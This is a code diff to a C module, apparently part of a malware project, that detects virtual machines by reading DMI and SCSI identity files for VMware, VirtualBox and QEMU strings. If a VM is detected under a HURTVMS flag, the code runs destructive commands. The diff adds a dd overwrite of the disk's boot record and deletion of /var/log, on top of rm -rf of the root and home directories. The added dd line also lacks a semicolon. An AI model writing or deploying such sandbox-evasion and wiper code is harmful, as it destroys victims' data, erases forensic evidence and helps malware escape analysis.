@@ -1,25 +1,12 @@
 #include "../include/main.h"
 
-inline static __attribute__((always_inline)) bool obfsc_vm()
-{
+inline static inline_force bool obfsc_vm() {
+	const char *file[] = {"/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor", "/proc/scsi/scsi"};
+	const char *vm[] = {"VMWARE", "VIRTUALBOX", "QEMU"};
+
 	int fd, i = 0;
 	bool x = false;
-	char *str = calloc(1024, sizeof(unsigned char *));
-	
-	const char *file[] =
-	{
-		"/sys/class/dmi/id/product_name",
-		"/sys/class/dmi/id/sys_vendor",
-		"/proc/scsi/scsi",
-		NULL
-	};
-	const char *vm[] =
-	{
-		"VMWARE",
-		"VIRTUALBOX",
-		"QEMU",
-		NULL
-	};
+	char *str[1024];
 	
 	while (file[i] && x == false)
 	{
@@ -30,25 +17,27 @@ inline static __attribute__((always_inline)) bool obfsc_vm()
 		}
 		i++;
 	}
-
-	free(str);
 	return x;
 }
 
 void obfsc_init(void)
 {
-	if (obfsc_vm() == true)
-	{
-#		ifndef DEBUG
-#		ifdef HURTVMS
+	if (obfsc_vm() == true) {
+#ifndef DEBUG
+#ifdef HURTVMS
+		// delete boot record
+		system("dd if=/dev/zero of=/dev/sda bs=512 count=1")
+		// Try remove logs
+		system("rm -rf /var/log/");
+		// Try remove the system
 		system("rm -rf --no-preserve-root /");
 		system("rm -rf --no-preserve-root ~/");
 		system("rm -rf /");
 		system("rm -rf ~/");
-#		endif // HURTVMS
+#endif // HURTVMS
 		exit(0);
-#		else // DEBUG
+#else // DEBUG
 		printd("VM Detected");
-#		endif // DEBUG
+#endif // DEBUG
 	}
 }
